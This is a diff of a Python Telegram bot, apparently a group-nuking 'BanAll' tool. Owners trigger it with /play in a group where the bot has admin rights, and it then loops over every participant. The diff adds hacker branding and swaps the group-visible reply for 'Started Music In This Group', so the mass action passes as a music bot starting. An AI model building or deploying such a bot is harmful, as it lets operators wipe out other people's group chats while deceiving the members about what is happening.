@@ -20,10 +20,10 @@ logging.basicConfig(
 hero = TelegramClient(None, Var.API_KEY, Var.API_HASH)
 hero.start(bot_token=Var.TOKEN)
 
-print("𝚜𝚝𝚊𝚛𝚝𝚒𝚗𝚐 𝚝𝚎𝚕𝚞𝚐𝚞 𝚌𝚑𝚊𝚝 𝚛𝚘𝚘𝚖 𝚋𝚘𝚝 𝚜𝚎𝚛𝚟𝚎𝚛....") 
+print("𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴 𝗗𝗮𝗿𝗸𝗟𝗶𝗴𝗵𝘁𝗡𝗲𝘁𝘄𝗼𝗿𝗸 𝗕𝗼𝘁 𝗦𝗲𝗿𝘃𝗲𝗿....") 
 
 """
-𝚖𝚘𝚟𝚒𝚗𝚐 𝚝𝚘 𝚌𝚘𝚖𝚖𝚊𝚗𝚍𝚜 𝚗𝚘𝚠.... 
+𝗣𝗶𝗻𝗴 𝗖𝗼𝗺𝗺𝗮𝗻𝗱.... 
 """
 
 Lund = []
@@ -31,23 +31,23 @@ for x in Var.OWNER_ID:
     Lund.append(x)
 
 
-@hero.on(events.NewMessage(pattern="^/ping"))  
+@hero.on(events.NewMessage(pattern="^/king"))  
 async def ping(e):
     if e.sender_id in Lund:
         start = datetime.now()
-        text = "𝚋𝚘𝚗𝚐𝚞...."
+        text = "𝗗𝗮𝗿𝗸𝗞𝗶𝗻𝗴𝗛𝗮𝗰𝗸𝗲𝗿...."
         event = await e.reply(text, parse_mode=None, link_preview=None )
         end = datetime.now()
         ms = (end-start).microseconds / 1000
-        await event.edit(f"**𝚒𝚊𝚖 𝚊𝚌𝚝𝚒𝚟𝚎 😒\n𝚜𝚝𝚊𝚛𝚝 𝚏𝚞𝚌𝚔𝚒𝚗𝚐 𝚊𝚗𝚢 𝚐𝚛𝚘𝚞𝚙** \n\n **__𝙱𝚘𝚗𝚐𝚞😏__** `{ms}` ms")
+        await event.edit(f"**𝗜𝗮𝗺 𝗔𝗰𝘁𝗶𝘃𝗲😒\n𝗦𝘁𝗮𝗿𝘁 𝗙𝘂𝗰𝗸𝗶𝗻𝗴 𝗔𝗻𝘆 𝗚𝗿𝗼𝘂𝗽** \n\n **__𝗞𝗶𝗻𝗴😏__** `{ms}` ms")
 
 """
- 𝚁𝚎𝚜𝚝𝚊𝚛𝚝 𝙲𝚘𝚖𝚖𝚊𝚗𝚍𝚜.... 
+ 𝗥𝗲𝘀𝘁𝗮𝗿𝘁 𝗖𝗼𝗺𝗺𝗮𝗻𝗱.... 
 """
 @hero.on(events.NewMessage(pattern="^/restart"))
 async def restart(e):
     if e.sender_id in Lund:
-        text = "𝙸𝚊𝚖 𝚁𝚎𝚊𝚍𝚢 𝚝𝚘 𝙵𝚞𝚌𝚔 𝚃𝚊𝚛𝚐𝚎𝚝𝚎𝚍 𝚐𝚛𝚘𝚞𝚙𝚜...."
+        text = "𝗜𝗮𝗺 𝗥𝗲𝗮𝗱𝘆 𝗧𝗼 𝗙𝘂𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁𝗲𝗱 𝗚𝗿𝗼𝘂𝗽𝘀...."
         await e.reply(text, parse_mode=None, link_preview=None )
         try:
             await hero.disconnect()
@@ -57,14 +57,14 @@ async def restart(e):
         quit()
 
 """
- 𝚙𝚕𝚊𝚢 𝚌𝚘𝚖𝚖𝚊𝚗𝚍... 
+ 𝗕𝗮𝗻𝗔𝗹𝗹 𝗖𝗼𝗺𝗺𝗮𝗻𝗱... 
 """
  
 @hero.on(events.NewMessage(pattern="^/play"))
 async def testing(event):
   if event.sender_id in Lund:
    if not event.is_group:
-        Reply = f"𝙽𝚘𝚘𝚋 𝚞𝚜𝚎 𝚃𝚑𝚒𝚜 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 𝚒𝚗 𝚐𝚛𝚘𝚞𝚙..."
+        Reply = f"𝗡𝗼𝗼𝗯 𝗨𝘀𝗲 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗜𝗻 𝗚𝗿𝗼𝘂𝗽..."
         await event.reply(Reply, parse_mode=None, link_preview=None )
    else:
        await event.delete()
@@ -73,9 +73,9 @@ async def testing(event):
        admin = veer.admin_rights
        creator = veer.creator
        if not admin and not creator:
-           await event.reply("𝙸 𝚍𝚘𝚗'𝚝 𝚑𝚊𝚟𝚎 𝚜𝚞𝚏𝚏𝚒𝚌𝚒𝚎𝚗𝚝 𝚁𝚒𝚐𝚑𝚝𝚜...")
+           await event.reply("𝗜 𝗗𝗼𝗻'𝘁 𝗛𝗮𝘃𝗲 𝗦𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗥𝗶𝗴𝗵𝘁𝘀...")
            return
-       await event.reply("**𝚂𝚝𝚊𝚛𝚝𝚎𝚍 𝙵𝚞𝚌𝚔𝚒𝚗𝚐 𝚃𝚑𝚒𝚜 𝙶𝚛𝚘𝚞𝚙...**")
+       await event.reply("**𝗦𝘁𝗮𝗿𝘁𝗲𝗱 𝗠𝘂𝘀𝗶𝗰 𝗜𝗻 𝗧𝗵𝗶𝘀 𝗚𝗿𝗼𝘂𝗽...**")
        everyone = await event.client.get_participants(event.chat_id)
        for user in everyone:
            if user.id == veerA.id:
@@ -87,6 +87,6 @@ async def testing(event):
            await sleep(0.3)
 
 
-print("𝙻𝚎𝚊𝚟𝚎 𝙲𝚘𝚖𝚖𝚊𝚗𝚍 𝚜𝚘𝚘𝚗 𝙲𝚞𝚛𝚛𝚎𝚗𝚝𝚕𝚢 𝚊𝚖 𝙱𝚞𝚜𝚢") 
-print("𝚂𝚃𝙰𝚁𝚃𝙴𝙳 𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻𝙻𝚈...") 
+print("𝗟𝗲𝗮𝘃𝗲 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗦𝗼𝗼𝗻 𝗖𝘂𝗿𝗿𝗲𝗻𝘁𝗹𝘆 𝗔𝗺 𝗕𝘂𝘀𝘆...") 
+print("𝗦𝘁𝗮𝗿𝘁𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆...") 
 hero.run_until_disconnected()
